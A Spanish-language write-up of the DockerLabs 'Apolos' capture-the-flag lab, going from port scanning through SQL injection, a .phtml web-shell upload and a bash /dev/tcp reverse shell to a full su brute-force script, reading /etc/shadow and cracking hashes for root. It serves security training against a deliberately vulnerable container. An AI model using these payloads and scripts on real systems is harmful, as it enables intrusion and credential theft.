---
title: DockerLabs - Apolos
summary: "Write-up del laboratorio Apolos de DockerLabs"
author: elcybercurioso
date: 2025-11-25
categories: [Post, DockerLabs]
tags: [medio, sqli, arbitrary file upload, rce, brute force, vulnerable groups]
media_subpath: "/assets/img/posts/dockerlabs_apolos"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ nmap -sCV -p80 172.17.0.2                         
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apple Store
|_http-server-header: Apache/2.4.58 (Ubuntu)
```

## análisis

Con **nmap** lanzamos un escaneo en busca de posibles recursos disponibles en el servidor web de la máquina víctima:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ nmap --script http-enum 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|   /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```

Hacemos la misma búsqueda, pero con **gobuster**, ya que nos permite indicar más filtros a emplear en la búsqueda, donde, pasado un rato, nos indica los siguientes recursos que revisaremos a continuación:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1619]
/index.php            (Status: 200) [Size: 5013]
/img                  (Status: 301) [Size: 306] [--> http://172.17.0.2/img/]
/register.php         (Status: 200) [Size: 1607]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 309] [--> http://172.17.0.2/vendor/]
/mycart.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 275]
/profile2.php         (Status: 302) [Size: 0] [--> login.php]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

En la página principal vemos que se trata de una página de venta de productos Apple:

![Desktop View](/20251116203036.webp){: width="972" height="589" .shadow}

De la búsqueda de recursos con **gobuster** hemos encontrado el recurso `login.php`, el cual contiene un formulario de inicio de sesión:

![Desktop View](/20251116203154.webp){: width="972" height="589" .shadow}

Otro recurso es `register.php`, el cual nos permite dar de alta un usuario nuevo:

![Desktop View](/20251116203208.webp){: width="972" height="589" .shadow}

Procedemos a crear una cuenta, nos logueamos, y vemos que nos redirige al perfil automáticamente:

![Desktop View](/20251116203256.webp){: width="972" height="589" .shadow}

Haciendo pruebas de la funcionalidad de búsqueda de productos, nos daremos cuenta de que existe una vulnerabilidad **SQLi** (SQL Injection):

```bash
' union select 1,2,3,4,5-- -
```

![Desktop View](/20251125212241.webp){: width="972" height="589" .shadow}

Por ello, procedemos a guardar la petición de búsqueda en un fichero:

![Desktop View](/20251116215905.webp){: width="972" height="589" .shadow}

Dicho fichero será el que emplearemos para dumpear la información guardada en la base de datos junto con la herramienta **sqlmap**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ sqlmap -r request.txt --level=5 --risk=3 --dump --batch                                                                                 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9#stable}
|_ -| . [.]     | .`| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: apple_store                                                                                                                                                                                            
Table: users
[4 entries]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 761b************************************        | luisillo |
| 2  | 7f73************************************        | admin    |
| 3  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | test     |
| 4  | a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 (test) | test1    |
+----+-------------------------------------------------+----------+

[21:01:21] [INFO] table 'apple_store.users' dumped to CSV file '/home/elcybercurioso/.local/share/sqlmap/output/172.17.0.2/dump/apple_store/users.csv'
[21:01:21] [INFO] fetching columns for table 'productos' in database 'apple_store'
[21:01:21] [INFO] fetching entries for table 'productos' in database 'apple_store'
Database: apple_store
Table: productos
[4 entries]
+----+-------+-----------------------+----------------------+---------+------------+-------------------------------------+-------------------+
| id | stock | imagen                | nombre               | precio  | categoria  | descripcion                         | fecha_lanzamiento |
+----+-------+-----------------------+----------------------+---------+------------+-------------------------------------+-------------------+
| 1  | 100   | iPhone14.jpg          | iPhone 14            | 799.99  | Smartphone | Nuevo iPhone 14 con A15 Bionic chip | 2023-09-20        |
| 2  | 50    | MacBookPro.jpg        | MacBook Pro          | 1299.00 | Laptop     | MacBook Pro con chip M1             | 2023-01-15        |
| 3  | 200   | AppleWatchSeries7.jpg | Apple Watch Series 7 | 399.00  | Wearable   | Ultima version del Apple Watch      | 2023-03-10        |
| 4  | 75    | macmini.jpg           | Mac Mini             | 699.99  | Desktop    | Nuevo Mac Mini con chip M2          | 2024-05-15        |
+----+-------+-----------------------+----------------------+---------+------------+-------------------------------------+-------------------+
```

Las credenciales hasheadas las tratamos de crackear empleando herramientas online como [crackstation.net](https://crackstation.net), la cual genera el hash de las cadenas que indicamos, y lo compara con un listado que tiene de millones de contraseñas:

![Desktop View](/20251116220518.webp){: width="972" height="589" .shadow}

Teniendo las credenciales en texto claro, procedemos a loguearnos con las dos cuentas:

![Desktop View](/20251116220658.webp){: width="972" height="589" .shadow}

En el panel de usuario de `admin` encontramos una funcionalidad que el otro usuario no tenía:

![Desktop View](/20251116220734.webp){: width="972" height="589" .shadow}

Vemos que nos manda a la página de administración de la web:

![Desktop View](/20251116220801.webp){: width="972" height="589" .shadow}

## acceso inicial (www-data)

Vemos que la única funcionalidad que está implementada es la de `Configuración`:

![Desktop View](/20251116220941.webp){: width="300" height="210" .shadow}

Esto nos lleva a un panel en el que nos permiten subir ficheros, por lo que tratamos de subir un script en PHP para poder ejecutar comandos remotamente:

![Desktop View](/20251116220838.webp){: width="972" height="589" .shadow}

Sin embargo, nos indican que no es posible subir ficheros con extensión `.php`:

![Desktop View](/20251116220854.webp){: width="600" height="420" .shadow}

Interceptamos la petición de subida de ficheros con Burp Suite, y la enviamos al `Repeter` para poder probar diferentes formas para ver si podemos saltarnos la validación empleada:

![Desktop View](/20251116221053.webp){: width="972" height="589" .shadow}

Tras probar diferentes extensiones que nos permitirían ejecutar comandos, finalmente encontramos que con la extensión `.phtml` nos permite subir el script (siendo `phtml` una de las extensiones que nos permiten ejecutar comandos con PHP):

![Desktop View](/20251116221321.webp){: width="972" height="589" .shadow}

En el recurso `/uploads` encontramos el script que acabamos de subir:

![Desktop View](/20251116221433.webp){: width="600" height="420" .shadow}

Indicamos el parámetro `cmd` con el comando `id`, y vemos que podemos ejecutar comandos con éxito:

![Desktop View](/20251116221456.webp){: width="650" height="450" .shadow}

Para poder operar con mayor facilidad, procedemos a ponernos en escucha con `nc`, y ejecutamos el siguiente comando para enviarnos una consola:

```bash
http://172.17.0.2/uploads/shell.phtml?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261"
```

Tras ejecutar el comando, deberíamos haber obtenido la consola correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ nc -nlvp 4444                     
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33718
www-data@f70bccf01ab8:/var/www/html/uploads$ whoami
whoami
www-data
www-data@f70bccf01ab8:/var/www/html/uploads$ hostname -I
hostname -I
172.17.0.2
```

Trataremos la TTY para tener la consola totalmente funcional:

```bash
www-data@f70bccf01ab8:/var/www/html/uploads$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@f70bccf01ab8:/var/www/html/uploads$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ stty raw -echo;fg                                      
[1]  + continued  nc -nlvp 4444
                               reset xterm
www-data@f70bccf01ab8:/var/www/html/uploads$ export TERM=xterm
www-data@f70bccf01ab8:/var/www/html/uploads$ export SHELL=bash
www-data@f70bccf01ab8:/var/www/html/uploads$ stty rows 49 columns 210
```

## movimiento lateral (luisillo_o)

Revisamos los potenciales usuarios a los que debemos apuntar para movernos lateralmente y/o escalar privilegios:

```bash
www-data@f70bccf01ab8:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo_o:x:1001:1001::/home/luisillo_o:/bin/sh
```

Dado que no encontramos nada nos permita movernos en alguna dirección, lo que resta es tratar de obtener la contraseña de algún usuario por fuerza bruta.

Para ello, emplearemos el siguiente [script](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh) de [Mario Álvarez Fernández](https://www.linkedin.com/in/maalfer1):

```bash
#!/bin/bash

# Función que se ejecutará en caso de que el usuario no proporcione 2 argumentos.
mostrar_ayuda() {
    echo -e "\e[1;33mUso: $0 USUARIO DICCIONARIO"
    echo -e "\e[1;31mSe deben especificar tanto el nombre de usuario como el archivo de diccionario.\e[0m"
    exit 1
}

# Para imprimir un sencillo banner en alguna parte del script.
imprimir_banner() {
    echo -e "\e[1;34m"  # Cambiar el texto a color azul brillante
    echo "******************************"
    echo "*     BruteForce SU         *"
    echo "******************************"
    echo -e "\e[0m"  # Restablecer los colores a los valores predeterminados
}

# Llamamos a esta función desde el trap finalizar SIGINT (En caso de que el usuario presione control + c para salir)
finalizar() {
    echo -e "\e[1;31m\nFinalizando el script\e[0m"
    exit
}

trap finalizar SIGINT

usuario=$1
diccionario=$2

# Variable especial $# para comprobar el número de parámetros introducido. En caso de no ser 2, se imprimen las instrucciones.
if [[ $# != 2 ]]; then
    mostrar_ayuda
fi

# Imprimimos el banner al momento de realizar el ataque.
imprimir_banner

# Bucle while que lee línea a línea el contenido de la variable $diccionario, que a su vez esta variable recibe el diccionario como parámetro.
while IFS= read -r password; do
    echo "Probando contraseña: $password"
    if timeout 0.1 bash -c "echo '$password' | su $usuario -c 'echo Hello'" > /dev/null 2>&1; then
        clear
        echo -e "\e[1;32mContraseña encontrada para el usuario $usuario: $password\e[0m"
        break
    fi
done < "$diccionario"
```

Una vez que los hemos descargado, lo pasamos a la máquina víctima junto con el diccionario que queramos, que en este caso será el `rockyou.txt` (en mi caso he copiado el diccionario a una ruta, y he abierto con Python un servidor, y en la máquina los he descargado con `wget`):

```bash
www-data@f70bccf01ab8:/tmp$ wget http://172.17.0.1/exploit.sh
--2025-XX-XX XX:XX:XX--  http://172.17.0.1/exploit.sh
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1600 (1.6K) [text/x-sh]
Saving to: 'exploit.sh'

exploit.sh                                           100%[====================================================================================================================>]   1.56K  --.-KB/s    in 0s      

2025-XX-XX XX:XX:XX (20.1 MB/s) - 'exploit.sh' saved [1600/1600]

www-data@f70bccf01ab8:/tmp$ wget http://172.17.0.1/rockyou.txt
--2025-XX-XX XX:XX:XX--  http://172.17.0.1/rockyou.txt
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 139921507 (133M) [text/plain]
Saving to: 'rockyou.txt'

rockyou.txt                                          100%[====================================================================================================================>] 133.44M   312MB/s    in 0.4s    

2025-XX-XX XX:XX:XX (312 MB/s) - 'rockyou.txt' saved [139921507/139921507]
```

Una vez que tenemos el script y el diccionario, procedemos a darle permisos de ejecución al script y lo ejecutamos:

```bash
www-data@f70bccf01ab8:/tmp$ chmod +x exploit.sh 
www-data@f70bccf01ab8:/tmp$ ./exploit.sh 
Uso: ./exploit.sh USUARIO DICCIONARIO
Se deben especificar tanto el nombre de usuario como el archivo de diccionario.
```

Tras un rato, veremos que nos habrá encontrado la contraseña correcta:

```bash
www-data@f70bccf01ab8:/tmp$ ./exploit.sh luisillo_o rockyou.txt 

******************************
*     BruteForce SU         *
******************************

Probando contraseña: 123456
Probando contraseña: 12345
Probando contraseña: 123456789
Probando contraseña: password
Probando contraseña: iloveyou
Probando contraseña: princess
...
Contraseña encontrada para el usuario luisillo_o: 1*******
```

Tratamos de loguearnos como el usuario `luisillo_o`, y vemos que la contraseña es correcta:

```bash
www-data@f70bccf01ab8:/tmp$ su luisillo_o
Password: 
$ whoami
luisillo_o
```

## escalada de privilegios (root)

Al ir a revisar los grupos a los que pertenece el usuario, vemos que uno de ellos destaca (`shadow`):

```bash
luisillo_o@f70bccf01ab8:/home$ id
uid=1001(luisillo_o) gid=1001(luisillo_o) groups=1001(luisillo_o),42(shadow)
```

El grupo `shadow` lo que nos permite es ver el contenido del fichero `/etc/shadow`, el cual contiene las credenciales encriptadas de los usuarios del sistema:

```bash
luisillo_o@f70bccf01ab8:/home$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo_o:x:1001:1001::/home/luisillo_o:/bin/sh
luisillo_o@f70bccf01ab8:/home$ cat /etc/shadow | grep -E "root|luisillo_o"
root:$y$j9T$awXWvi2tYABgO5kreZcIi/$obvQc0Amd6lFWbwfElQhZD6vpJN/AEV8/hZMXLYTx07:19969:0:99999:7:::
luisillo_o:$y$j9T$jeXc8lTJhOBTedetDcKHI/$Bo6qPkbZFVsfWoTJvAZ1x0t2jG3aGsHjOjxkqOpBGg6:19969:0:99999:7:::
```

Teniendo acceso a los ficheros `/etc/passwd` y `/etc/shadow`, podemos emplear utilidades como `unshadow` para generar un fichero con los hashes del sistema, los cuales herramientas como `john` puedan tratar de romper por fuerza bruta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Apolos]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt --format=crypt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1*******         (luisillo_o)     
r*******         (root)     
2g 0:00:03:14 DONE (2025-XX-XX XX:XX) 0.01028g/s 66.12p/s 98.68c/s 98.68C/s rainbow2..wendel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Pasado un tiempo, habremos obtenido las claves en texto claro, permitiéndonos conectarnos como el usuario `root`:

```bash
luisillo_o@f70bccf01ab8:/home$ su root
Password: 
root@f70bccf01ab8:/home# whoami
root
```

Y hasta aquí la máquina Apolos!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>